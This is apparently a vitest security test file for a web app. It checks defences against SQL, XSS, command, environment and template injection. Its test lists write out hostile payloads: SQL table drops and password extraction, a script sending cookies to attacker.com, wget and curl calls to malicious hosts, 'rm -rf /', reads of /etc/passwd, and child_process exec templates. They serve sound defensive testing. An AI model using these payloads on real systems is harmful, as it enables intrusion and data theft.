/* eslint-disable @typescript-eslint/no-unused-vars, @typescript-eslint/no-explicit-any */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { testDb } from '../../integration/setup';
import { posts, categories, users } from '$lib/server/db/schema';
import { eq } from 'drizzle-orm';
import { testIsolation } from '../../integration/utils/test-isolation';
import { SecurityTestHelpers, type AttackPayload } from '../utils/security-test-helpers';

/**
 * Injection Attack Prevention Tests
 *
 * Tests prevention mechanisms for:
 * - SQL Injection attacks
 * - Cross-Site Scripting (XSS) attacks
 * - Command Injection attacks
 * - LDAP Injection attacks
 * - NoSQL Injection attacks
 * - Template Injection attacks
 */
describe('Injection Attack Prevention Tests', () => {
	let testUserId: string;

	beforeEach(async () => {
		testUserId = await testIsolation.createTestUser();
	});

	afterEach(async () => {
		// Cleanup handled by test isolation
	});

	describe('SQL Injection Prevention', () => {
		it('should prevent basic SQL injection attacks', async () => {
			const sqlPayloads = SecurityTestHelpers.getSQLInjectionPayloads();

			for (const payload of sqlPayloads) {
				try {
					// Test with Drizzle ORM (should be safe by default)
					const result = await testDb
						.select()
						.from(posts)
						.where(eq(posts.title, payload.payload)); // Parameterized query

					// Query should execute without throwing an error
					// and should not return unauthorized data
					expect(Array.isArray(result)).toBe(true);

					// Should not find any posts with the malicious payload as title
					expect(result.length).toBe(0);
				} catch (error) {
					// Some payloads might cause query errors, which is acceptable
					// as long as no data leakage occurs
					expect((error as Error).message).not.toContain('users');
					expect((error as Error).message).not.toContain('password');
					expect((error as Error).message).not.toContain('admin');
				}
			}
		});

		it('should validate parameterized queries prevent injection', async () => {
			// Create a test post
			const [testPost] = await testDb
				.insert(posts)
				.values({
					title: 'Test Post',
					slug: 'test-post',
					content: 'Test content',
					excerpt: 'Test excerpt',
					status: 'published',
					userId: testUserId,
					createdAt: new Date(),
					updatedAt: new Date()
				})
				.returning();

			// Test SQL injection attempts against search functionality
			const maliciousSearchTerms = [
				"'; DROP TABLE posts; --",
				"' OR '1'='1' --",
				"' UNION SELECT username, password FROM users --",
				"'; INSERT INTO posts VALUES ('hacked'); --"
			];

			for (const searchTerm of maliciousSearchTerms) {
				// This should safely search for the literal string, not execute SQL
				const results = await testDb
					.select()
					.from(posts)
					.where(eq(posts.title, searchTerm));

				// Should return empty results (no posts with these titles)
				expect(results).toHaveLength(0);

				// Verify original test post still exists (table wasn't dropped)
				const originalPost = await testDb
					.select()
					.from(posts)
					.where(eq(posts.id, testPost.id));

				expect(originalPost).toHaveLength(1);
				expect(originalPost[0].title).toBe('Test Post');
			}
		});

		it('should handle dynamic query construction safely', async () => {
			// Test dynamic WHERE clauses with potential injection
			const mockBuildDynamicQuery = (filters: Record<string, string>) => {
				// Simulate safe dynamic query building
				const allowedFields = ['title', 'status', 'excerpt'];
				const whereConditions: any[] = [];

				for (const [field, value] of Object.entries(filters)) {
					// Validate field names against whitelist
					if (!allowedFields.includes(field)) {
						throw new Error(`Invalid field: ${field}`);
					}

					// Use parameterized queries for values
					whereConditions.push(eq((posts as any)[field], value));
				}

				return whereConditions;
			};

			// Test with valid fields
			const validFilters = { title: 'Test Post', status: 'published' };
			const validConditions = mockBuildDynamicQuery(validFilters);
			expect(validConditions).toHaveLength(2);

			// Test with invalid field (injection attempt)
			const invalidFilters = { 'title; DROP TABLE posts; --': 'malicious' };
			expect(() => {
				mockBuildDynamicQuery(invalidFilters);
			}).toThrow('Invalid field');

			// Test with field containing SQL keywords
			const sqlKeywordFilters = { 'UNION SELECT': 'attack' };
			expect(() => {
				mockBuildDynamicQuery(sqlKeywordFilters);
			}).toThrow('Invalid field');
		});

		it('should prevent blind SQL injection attacks', async () => {
			// Create test data
			const [testPost] = await testDb
				.insert(posts)
				.values({
					title: 'Sensitive Post',
					slug: 'sensitive-post',
					content: 'Sensitive content',
					excerpt: 'Sensitive excerpt',
					status: 'draft', // Not publicly visible
					userId: testUserId,
					createdAt: new Date(),
					updatedAt: new Date()
				})
				.returning();

			// Blind SQL injection attempts to extract information
			const blindSQLPayloads = [
				"' AND (SELECT COUNT(*) FROM users) > 0 --",
				"' AND (SELECT LENGTH(password) FROM users LIMIT 1) > 5 --",
				"' AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a' --",
				"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 65 --"
			];

			for (const payload of blindSQLPayloads) {
				// Query should not reveal information about database structure
				const results = await testDb.select().from(posts).where(eq(posts.title, payload));

				// Should return empty results
				expect(results).toHaveLength(0);

				// Response time should not vary significantly (prevent timing attacks)
				const startTime = Date.now();
				await testDb.select().from(posts).where(eq(posts.content, payload));
				const endTime = Date.now();

				// Query should complete quickly (no time-based injection)
				expect(endTime - startTime).toBeLessThan(1000);
			}
		});
	});

	describe('Cross-Site Scripting (XSS) Prevention', () => {
		it('should sanitize user input to prevent XSS attacks', () => {
			const xssPayloads = SecurityTestHelpers.getXSSPayloads();

			// Mock HTML sanitization function
			const mockSanitizeHTML = (input: string): string => {
				return input
					.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '') // Remove script tags
					.replace(/javascript:/gi, '') // Remove javascript: protocol
					.replace(/on\w+\s*=/gi, '') // Remove event handlers
					.replace(/<iframe\b[^>]*>/gi, '') // Remove iframe tags
					.replace(/<object\b[^>]*>/gi, '') // Remove object tags
					.replace(/<embed\b[^>]*>/gi, ''); // Remove embed tags
			};

			for (const payload of xssPayloads) {
				const sanitized = mockSanitizeHTML(payload.payload);
				const testResult = SecurityTestHelpers.testInputSanitization(
					payload.payload,
					sanitized
				);

				expect(testResult.isSanitized).toBe(true);
				expect(testResult.risks).toHaveLength(0);

				// Verify specific dangerous patterns are removed
				expect(sanitized).not.toContain('<script');
				expect(sanitized).not.toContain('javascript:');
				expect(sanitized).not.toContain('onerror');
				expect(sanitized).not.toContain('<iframe');
			}
		});

		it('should handle context-specific XSS prevention', () => {
			const testContexts = [
				{
					context: 'HTML attribute',
					input: '" onmouseover="alert(\'XSS\')" "',
					sanitizer: (input: string) =>
						input.replace(/['"<>&]/g, (char) => {
							const entities: Record<string, string> = {
								'"': '&quot;',
								"'": '&#x27;',
								'<': '&lt;',
								'>': '&gt;',
								'&': '&amp;'
							};
							return entities[char] || char;
						})
				},
				{
					context: 'JavaScript string',
					input: "'; alert('XSS'); '",
					sanitizer: (input: string) => input.replace(/[\\'"]/g, '\\$&')
				},
				{
					context: 'CSS value',
					input: "expression(alert('XSS'))",
					sanitizer: (input: string) => input.replace(/expression\s*\(/gi, '')
				},
				{
					context: 'URL parameter',
					input: "javascript:alert('XSS')",
					sanitizer: (input: string) => {
						try {
							const url = new URL(input, 'http://localhost');
							return url.protocol === 'javascript:' ? '' : input;
						} catch {
							return encodeURIComponent(input);
						}
					}
				}
			];

			testContexts.forEach(({ context, input, sanitizer }) => {
				const sanitized = sanitizer(input);

				// Should not contain dangerous patterns
				expect(sanitized).not.toContain('alert(');
				expect(sanitized).not.toContain('javascript:');
				expect(sanitized).not.toContain('expression(');

				// Should be properly escaped/sanitized for context
				if (context === 'HTML attribute') {
					expect(sanitized).not.toContain('"');
					expect(sanitized).not.toContain("'");
				}
			});
		});

		it('should validate Content Security Policy prevents XSS', () => {
			// Mock CSP header validation
			const mockCSPHeaders = [
				"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'",
				"default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'",
				"default-src 'self'; script-src 'self' https://trusted-cdn.com; frame-ancestors 'none'"
			];

			const validateCSP = (csp: string) => {
				const directives = csp.split(';').map((d) => d.trim());
				const issues: string[] = [];

				// Check for dangerous CSP configurations
				if (csp.includes("'unsafe-eval'")) {
					issues.push("'unsafe-eval' allows dangerous JavaScript execution");
				}

				if (csp.includes('script-src *') || csp.includes('default-src *')) {
					issues.push('Wildcard (*) in script-src allows any script execution');
				}

				if (!csp.includes('object-src') && !csp.includes("object-src 'none'")) {
					issues.push('Missing object-src directive allows plugin execution');
				}

				if (csp.includes('data:') && csp.includes('script-src')) {
					issues.push('data: protocol in script-src can be dangerous');
				}

				return {
					isSecure: issues.length === 0,
					issues
				};
			};

			mockCSPHeaders.forEach((csp) => {
				const result = validateCSP(csp);
				// All test CSP headers should be reasonably secure
				expect(result.issues.length).toBeLessThanOrEqual(1);
			});

			// Test dangerous CSP
			const dangerousCSP = "default-src *; script-src * 'unsafe-eval' 'unsafe-inline'";
			const dangerousResult = validateCSP(dangerousCSP);
			expect(dangerousResult.isSecure).toBe(false);
			expect(dangerousResult.issues.length).toBeGreaterThan(0);
		});

		it('should prevent DOM-based XSS attacks', () => {
			// Simulate DOM manipulation with user input
			const mockSecureDOMUpdate = (elementId: string, userInput: string) => {
				// Simulate safe DOM text content setting (not innerHTML)
				const safeMethods = {
					textContent: (input: string) => {
						// textContent automatically escapes HTML
						return { method: 'textContent', content: input, safe: true };
					},
					innerHTML: (input: string) => {
						// innerHTML is dangerous without sanitization
						const sanitized = input
							.replace(/</g, '&lt;')
							.replace(/>/g, '&gt;')
							.replace(/"/g, '&quot;')
							.replace(/'/g, '&#x27;');
						return { method: 'innerHTML', content: sanitized, safe: true };
					}
				};

				// Always use textContent for user input
				return safeMethods.textContent(userInput);
			};

			const domXSSPayloads = [
				'<img src="x" onerror="alert(\'DOM XSS\')">',
				"<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>",
				'"><svg onload="alert(\'DOM XSS\')">',
				"javascript:alert('DOM XSS')"
			];

			domXSSPayloads.forEach((payload) => {
				const result = mockSecureDOMUpdate('test-element', payload);

				expect(result.safe).toBe(true);
				expect(result.method).toBe('textContent');

				// When using textContent, HTML is escaped automatically
				expect(result.content).toBe(payload); // Original content preserved as text
			});
		});
	});

	describe('Command Injection Prevention', () => {
		it('should prevent command injection in file operations', () => {
			const commandPayloads = SecurityTestHelpers.getCommandInjectionPayloads();

			// Mock secure file operation
			const mockSecureFileOperation = (filename: string) => {
				// Validate filename for dangerous characters
				const dangerousChars = /[;&|`$(){}[\]<>\\]/;
				if (dangerousChars.test(filename)) {
					throw new Error('Invalid filename: contains dangerous characters');
				}

				// Validate filename length and format
				if (filename.length > 255) {
					throw new Error('Filename too long');
				}

				if (filename.startsWith('.') || filename.includes('..')) {
					throw new Error('Invalid filename: path traversal attempt');
				}

				// Only allow alphanumeric, hyphens, underscores, and dots
				const validPattern = /^[a-zA-Z0-9._-]+$/;
				if (!validPattern.test(filename)) {
					throw new Error('Invalid filename: contains invalid characters');
				}

				return { operation: 'file_read', filename, safe: true };
			};

			commandPayloads.forEach((payload) => {
				expect(() => {
					mockSecureFileOperation(payload.payload);
				}).toThrow('Invalid filename');
			});

			// Test valid filenames
			const validFilenames = ['document.txt', 'image_01.jpg', 'report-2024.pdf'];
			validFilenames.forEach((filename) => {
				const result = mockSecureFileOperation(filename);
				expect(result.safe).toBe(true);
				expect(result.filename).toBe(filename);
			});
		});

		it('should sanitize input for system operations', () => {
			// Mock secure system command execution
			const mockSecureSystemCommand = (command: string, args: string[]) => {
				// Whitelist of allowed commands
				const allowedCommands = ['convert', 'identify', 'ffmpeg'];

				if (!allowedCommands.includes(command)) {
					throw new Error(`Command not allowed: ${command}`);
				}

				// Validate each argument
				args.forEach((arg, index) => {
					// No shell metacharacters allowed
					const dangerousChars = /[;&|`$(){}[\]<>\\*?]/;
					if (dangerousChars.test(arg)) {
						throw new Error(`Dangerous characters in argument ${index}: ${arg}`);
					}

					// No path traversal
					if (arg.includes('..') || arg.startsWith('/etc') || arg.startsWith('/proc')) {
						throw new Error(`Path traversal attempt in argument ${index}: ${arg}`);
					}
				});

				return { command, args, validated: true };
			};

			// Test malicious commands
			const maliciousCommands = [
				{ cmd: 'rm', args: ['-rf', '/'] },
				{ cmd: 'cat', args: ['/etc/passwd'] },
				{ cmd: 'wget', args: ['http://malicious.com/backdoor.sh'] },
				{ cmd: 'nc', args: ['-l', '1234'] }
			];

			maliciousCommands.forEach(({ cmd, args }) => {
				expect(() => {
					mockSecureSystemCommand(cmd, args);
				}).toThrow();
			});

			// Test command injection in arguments
			const injectionArgs = [
				'; rm -rf /',
				'| cat /etc/passwd',
				'&& curl http://attacker.com',
				'$(whoami)',
				'`id`'
			];

			injectionArgs.forEach((arg) => {
				expect(() => {
					mockSecureSystemCommand('convert', ['input.jpg', arg, 'output.jpg']);
				}).toThrow('Dangerous characters');
			});

			// Test valid operation
			const validResult = mockSecureSystemCommand('convert', [
				'input.jpg',
				'-resize',
				'100x100',
				'output.jpg'
			]);
			expect(validResult.validated).toBe(true);
		});

		it('should validate environment variable injection', () => {
			// Mock secure environment variable handling
			const mockSecureEnvironment = (envVars: Record<string, string>) => {
				const allowedVars = ['NODE_ENV', 'PORT', 'DATABASE_URL', 'LOG_LEVEL'];
				const errors: string[] = [];

				Object.entries(envVars).forEach(([key, value]) => {
					// Check variable name
					if (!allowedVars.includes(key)) {
						errors.push(`Environment variable not allowed: ${key}`);
					}

					// Check for command injection in values
					const dangerousPatterns = [
						/[;&|`$(){}]/,
						/\$\([^)]*\)/, // Command substitution
						/`[^`]*`/, // Backtick execution
						/\|\s*\w+/ // Pipe to command
					];

					dangerousPatterns.forEach((pattern) => {
						if (pattern.test(value)) {
							errors.push(`Dangerous pattern in ${key}: ${value}`);
						}
					});
				});

				return {
					valid: errors.length === 0,
					errors
				};
			};

			// Test malicious environment variables
			const maliciousEnvVars = {
				PATH: '/bin:/usr/bin:$(curl http://attacker.com)',
				LD_PRELOAD: '/tmp/malicious.so',
				NODE_ENV: 'production; rm -rf /',
				CUSTOM_VAR: '`cat /etc/passwd`'
			};

			const result = mockSecureEnvironment(maliciousEnvVars);
			expect(result.valid).toBe(false);
			expect(result.errors.length).toBeGreaterThan(0);

			// Test valid environment variables
			const validEnvVars = {
				NODE_ENV: 'production',
				PORT: '3000',
				LOG_LEVEL: 'info'
			};

			const validResult = mockSecureEnvironment(validEnvVars);
			expect(validResult.valid).toBe(true);
			expect(validResult.errors).toHaveLength(0);
		});
	});

	describe('Template Injection Prevention', () => {
		it('should prevent server-side template injection', () => {
			// Mock secure template rendering
			const mockSecureTemplateRender = (template: string, data: Record<string, any>) => {
				// Check for dangerous template expressions
				const dangerousPatterns = [
					/\{\{\s*.*constructor.*\}\}/, // Constructor access
					/\{\{\s*.*process.*\}\}/, // Process access
					/\{\{\s*.*global.*\}\}/, // Global access
					/\{\{\s*.*require.*\}\}/, // Module loading
					/\{\{\s*.*import.*\}\}/, // ES6 imports
					/\{\{\s*.*eval.*\}\}/, // Code evaluation
					/\{\{\s*.*Function.*\}\}/ // Function constructor
				];

				dangerousPatterns.forEach((pattern) => {
					if (pattern.test(template)) {
						throw new Error('Dangerous template expression detected');
					}
				});

				// Simple whitelist-based variable substitution
				const allowedVars = Object.keys(data);
				const varPattern = /\{\{\s*(\w+)\s*\}\}/g;

				const result = template.replace(varPattern, (match, varName) => {
					if (!allowedVars.includes(varName)) {
						throw new Error(`Template variable not allowed: ${varName}`);
					}
					return String(data[varName] || '');
				});

				return result;
			};

			// Test malicious template injection attempts
			const maliciousTemplates = [
				'{{ constructor.constructor("return process")() }}',
				'{{ global.process.mainModule.require("child_process").exec("rm -rf /") }}',
				'{{ this.constructor.constructor("return process.env")() }}',
				'{{ require("fs").readFileSync("/etc/passwd", "utf8") }}',
				'{{ Function("return process")() }}'
			];

			const templateData = { name: 'Test User', age: 25 };

			maliciousTemplates.forEach((template) => {
				expect(() => {
					mockSecureTemplateRender(template, templateData);
				}).toThrow('Dangerous template expression detected');
			});

			// Test valid template
			const validTemplate = 'Hello {{ name }}, you are {{ age }} years old.';
			const result = mockSecureTemplateRender(validTemplate, templateData);
			expect(result).toBe('Hello Test User, you are 25 years old.');

			// Test unauthorized variable access
			const unauthorizedTemplate = 'Secret: {{ secret }}';
			expect(() => {
				mockSecureTemplateRender(unauthorizedTemplate, templateData);
			}).toThrow('Template variable not allowed: secret');
		});

		it('should validate client-side template security', () => {
			// Mock client-side template validation
			const mockValidateClientTemplate = (template: string) => {
				const securityIssues: string[] = [];

				// Check for dangerous JavaScript execution
				if (template.includes('eval(') || template.includes('Function(')) {
					securityIssues.push('Template contains dangerous JavaScript execution');
				}

				// Check for DOM manipulation
				if (template.includes('document.') || template.includes('window.')) {
					securityIssues.push('Template contains DOM/window access');
				}

				// Check for external resource loading
				if (template.includes('XMLHttpRequest') || template.includes('fetch(')) {
					securityIssues.push('Template contains network requests');
				}

				// Check for event handler injection
				if (/on\w+\s*=/.test(template)) {
					securityIssues.push('Template contains event handlers');
				}

				return {
					safe: securityIssues.length === 0,
					issues: securityIssues
				};
			};

			// Test dangerous client templates
			const dangerousClientTemplates = [
				'<div onclick="eval(maliciousCode)">Click me</div>',
				'<script>window.location = "http://attacker.com"</script>',
				'<img src="x" onerror="fetch(\'/steal-data\')">',
				'{{constructor.constructor("return document")()}}'
			];

			dangerousClientTemplates.forEach((template) => {
				const result = mockValidateClientTemplate(template);
				expect(result.safe).toBe(false);
				expect(result.issues.length).toBeGreaterThan(0);
			});

			// Test safe client template
			const safeTemplate = '<div class="user-info">Name: {{name}}</div>';
			const safeResult = mockValidateClientTemplate(safeTemplate);
			expect(safeResult.safe).toBe(true);
			expect(safeResult.issues).toHaveLength(0);
		});
	});

	describe('Input Validation and Sanitization', () => {
		it('should validate all input types comprehensively', () => {
			const mockComprehensiveValidation = (input: any, type: string) => {
				const errors: string[] = [];

				switch (type) {
					case 'email':
						if (
							typeof input !== 'string' ||
							!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input)
						) {
							errors.push('Invalid email format');
						}
						if (input.length > 254) {
							errors.push('Email too long');
						}
						break;

					case 'number':
						if (typeof input !== 'number' || !Number.isFinite(input)) {
							errors.push('Invalid number');
						}
						if (input < 0 || input > 1000000) {
							errors.push('Number out of range');
						}
						break;

					case 'string':
						if (typeof input !== 'string') {
							errors.push('Input must be string');
						}
						if (input.length > 1000) {
							errors.push('String too long');
						}
						// Check for dangerous patterns
						if (/<script|javascript:|on\w+=/i.test(input)) {
							errors.push('String contains dangerous content');
						}
						break;

					case 'url':
						try {
							const url = new URL(input);
							if (!['http:', 'https:'].includes(url.protocol)) {
								errors.push('Invalid URL protocol');
							}
						} catch {
							errors.push('Invalid URL format');
						}
						break;
				}

				return {
					valid: errors.length === 0,
					errors
				};
			};

			// Test various input types
			const testCases = [
				{ input: 'user@example.com', type: 'email', shouldPass: true },
				{ input: 'invalid-email', type: 'email', shouldPass: false },
				{
					input: 'user@example.com<script>alert(1)</script>',
					type: 'email',
					shouldPass: false
				},
				{ input: 42, type: 'number', shouldPass: true },
				{ input: -1, type: 'number', shouldPass: false },
				{ input: 'Safe string', type: 'string', shouldPass: true },
				{ input: '<script>alert("XSS")</script>', type: 'string', shouldPass: false },
				{ input: 'https://example.com', type: 'url', shouldPass: true },
				{ input: 'javascript:alert("XSS")', type: 'url', shouldPass: false }
			];

			testCases.forEach(({ input, type, shouldPass }) => {
				const result = mockComprehensiveValidation(input, type);
				if (shouldPass) {
					expect(result.valid).toBe(true);
				} else {
					expect(result.valid).toBe(false);
					expect(result.errors.length).toBeGreaterThan(0);
				}
			});
		});

		it('should prevent encoding bypass attacks', () => {
			// Mock encoding-aware validation
			const mockEncodingAwareValidation = (input: string) => {
				// Decode various encoding attempts
				let decoded = input;

				// URL decoding
				try {
					decoded = decodeURIComponent(decoded);
				} catch {
					// Invalid URL encoding
				}

				// HTML entity decoding (simplified)
				decoded = decoded
					.replace(/&lt;/g, '<')
					.replace(/&gt;/g, '>')
					.replace(/&quot;/g, '"')
					.replace(/&#x27;/g, "'")
					.replace(/&amp;/g, '&');

				// Double URL decoding attempt
				try {
					const doubleDecoded = decodeURIComponent(decoded);
					if (doubleDecoded !== decoded) {
						decoded = doubleDecoded;
					}
				} catch {
					// Invalid encoding
				}

				// Check for dangerous patterns after decoding
				const dangerousPatterns = [
					/<script/i,
					/javascript:/i,
					/on\w+\s*=/i,
					/<iframe/i,
					/eval\s*\(/i
				];

				const foundDangerous = dangerousPatterns.some((pattern) => pattern.test(decoded));

				return {
					safe: !foundDangerous,
					original: input,
					decoded,
					dangerous: foundDangerous
				};
			};

			// Test encoding bypass attempts
			const encodingBypassAttempts = [
				'%3Cscript%3Ealert%281%29%3C%2Fscript%3E', // URL encoded <script>
				'&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entity encoded
				'%253Cscript%253E', // Double URL encoded
				'&#60;script&#62;', // Numeric HTML entities
				'%6A%61%76%61%73%63%72%69%70%74%3A', // URL encoded 'javascript:'
				'%2522%2520onmouseover%253D%2522alert%25281%2529%2522' // Multiple encoding layers
			];

			encodingBypassAttempts.forEach((attempt) => {
				const result = mockEncodingAwareValidation(attempt);
				expect(result.dangerous).toBe(true);
				expect(result.safe).toBe(false);
			});

			// Test safe encoded content
			const safeEncoded = 'Hello%20World%21'; // "Hello World!"
			const safeResult = mockEncodingAwareValidation(safeEncoded);
			expect(safeResult.safe).toBe(true);
			expect(safeResult.decoded).toBe('Hello World!');
		});
	});
});
